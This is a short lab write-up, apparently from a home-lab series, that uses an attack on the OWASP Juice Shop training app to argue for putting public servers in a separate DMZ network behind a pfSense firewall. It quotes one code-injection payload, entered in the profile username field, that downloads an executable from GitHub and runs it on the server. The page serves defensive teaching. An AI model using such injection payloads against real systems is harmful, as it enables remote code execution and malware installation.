---
title: 06 Why DMZ?
type: docs
---

As a demonstration of why a publicly accessible server like `juiceshop` should be "quarantined" from other internal machines in the `LAN` network, I'll have the `hacker` VM exploit the [malware vulnerability](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution) in the web application.

This involves passing code that downloads and executes a fake malware file from the internet. This was accomplished by pass this value in the username input field in the Juice Shop profile page:
```
#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/juice-shop/juicy-malware/raw/master/juicy_malware_linux_amd_64 && chmod +x malware && ./malware')}
```

Because the `juiceshop` server is in the `LAN` network, the `pfsense` firewall allowed it to download the file.

For this lab, I'll create another isolated virtual network, called `DMZ`. I won't give `DMZ` the same firewall rules as `LAN`. The web server `juiceshop` won't need to download files or access the `LAN` network. It's hosting the web application. If I find that I need to add rules for it to function, I can add them later.

I could create host-specific firewall rules for the `LAN` network that apply to `juiceshop` and not `sysadmin` or other devices I could have on the `LAN`. But you would also need rules to restrict access from `juiceshop` communicating with other machines in the `LAN`. I think it's simpler to have a seperate interface for publicly-accessible servers like `juiceshop`. If there other publicly-accessible servers in the future, they can be added to the same `DMZ` without requiring more host-specific firewall rules.